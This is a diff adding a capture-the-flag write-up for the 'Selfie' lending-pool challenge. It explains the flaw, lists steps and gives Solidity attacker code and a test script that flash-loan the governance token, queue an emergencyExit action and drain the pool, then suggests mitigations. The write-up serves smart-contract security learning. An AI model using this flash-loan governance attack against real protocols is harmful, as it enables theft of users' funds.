@@ -113,3 +113,74 @@ function flashLoan(uint256 amount) external {
         emit Deposit(msg.sender, msg.value);
     }
 ```
+
+
+# 5 - Selfie
+## **Problem:**
+A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.
+
+What could go wrong, right ?
+
+You start with no DVT tokens in balance, and the pool has 1.5 million at risk.
+
+Rescue all funds from the pool and deposit them into the designated recovery account.
+
+## **Solution:**
+The pool allows users to borrow DVT tokens and then repay them. The pool also as an emergency withdraw function that can be called by the governance contract. The governance contract is a simple ERC20Votes contract that allows users to vote on proposals if they have 50%+1 of the total supply.
+The DVT token is the one used for governance (ERC20Votes). 
+The problem is that anyone could flashloan all the govenance tokens, delegate themself and propose a new action to start the emergency withdraw function.
+
+Steps:
+1. Flashloan all the DVT Vote tokens from the pool.
+2. Now that the attacker has the majority of the votes, delegate himself and propose a new action to call the emergency withdraw function.
+3. Repay the flashloan.
+4. Waiting the action delay to execute the action.
+5. Execute the action to withdraw all the funds from the pool.
+
+
+### **Code:**
+Attacker contract's `attack` function:
+```javascript
+function attack() external returns (uint256) {
+    SelfiePool(pool).flashLoan(
+        this,
+        address(governanceToken),
+        SelfiePool(pool).maxFlashLoan(address(governanceToken)),
+        ""
+    );     
+    return actionId;    
+}
+
+function onFlashLoan(
+    address initiator,
+    address token,
+    uint256 amount,
+    uint256 fee,
+    bytes calldata data) external override returns (bytes32) {
+    Votes(token).delegate(address(this));
+    // Add a governance action to queue that calls emergencyExit on the pool
+    actionId = ISimpleGovernance(governance).queueAction(
+        pool,
+        0,
+        abi.encodeWithSignature("emergencyExit(address)", recovery)
+    );
+
+    // Approve to repay the loan
+    IERC20(token).approve(pool, amount + fee);
+
+    return keccak256("ERC3156FlashBorrower.onFlashLoan");
+}
+```
+
+Player executing the attack and waiting for the action delay to execute the action:
+```javascript
+Attacker attacker = new Attacker(address(pool), recovery, address(governance), token);
+uint256 actionId = attacker.attack();
+// Execute the queued action after the delay
+vm.warp(block.timestamp + ISimpleGovernance(governance).getActionDelay());
+ISimpleGovernance(governance).executeAction(actionId);
+```
+
+## **Mitigation:**
+Consider not using the same token for governance and for the pool.
+Governance token should not be counted for borrowed tokens.
